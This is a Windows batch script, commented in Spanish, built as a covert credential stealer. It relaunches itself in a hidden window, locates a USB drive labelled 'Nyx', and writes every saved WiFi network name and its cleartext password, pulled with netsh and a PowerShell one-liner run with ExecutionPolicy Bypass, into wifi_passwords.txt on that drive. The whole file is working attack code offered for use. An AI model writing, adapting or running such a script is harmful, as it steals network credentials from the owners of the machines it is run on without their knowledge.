@echo off

:: ====================================================
::               BLOQUE DE CONFIGURACION
:: ====================================================
set "NOMBRE_USB=Nyx"
:: ====================================================


:: Ejecutarse en segundo plano si no lo esta
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: Buscar la letra de la unidad USB por su etiqueta de volumen
for /f "delims=" %%D in ('powershell -NoProfile -Command "(Get-Volume | Where-Object {$_.FileSystemLabel -eq '%NOMBRE_USB%'}).DriveLetter"') do (
    set "DRIVE=%%D"
)

:: Si no encuentra la USB con ese nombre, aborta el script
if "%DRIVE%"=="" exit

:: Definir la ruta de destino dentro del almacenamiento de NyxUSB
set "DESTINO=%DRIVE%:\"
set "FOLDER_DATA=%DESTINO%Data"

:: Si la carpeta Data no existe, la crea
if not exist "%FOLDER_DATA%" (
    mkdir "%FOLDER_DATA%"
)

:: Definir la ruta del archivo final de reportes
set "ARCHIVO_REPORTE=%FOLDER_DATA%\wifi_passwords.txt"

:: Crear o limpiar el archivo con el encabezado inicial
echo Redes WiFi detectadas en el sistema operativo: > "%ARCHIVO_REPORTE%"
echo =================================================== >> "%ARCHIVO_REPORTE%"

:: Bucle en PowerShell puro de una sola linea (evita problemas de escape en Batch)
powershell -NoProfile -ExecutionPolicy Bypass -Command "netsh wlan show profiles | Select-String ':\s(.*)$' | ForEach-Object { $p = $_.Matches.Groups[1].Value.Trim(); $info = netsh wlan show profile name=$p key=clear; $ssidLine = $info | Select-String 'Nombre de SSID'; $passLine = $info | Select-String 'Contenido de la clave'; if ($ssidLine) { $ssid = $ssidLine.Line.Split(':')[1].Trim().Replace('\"', ''); $pass = if ($passLine) { $passLine.Line.Split(':')[1].Trim() } else { '[Red Abierta o sin clave]' }; Add-Content -Path '%ARCHIVO_REPORTE%' -Value \"`nSSID: $ssid`nPASS: $pass`n----------------------- \" } }"

exit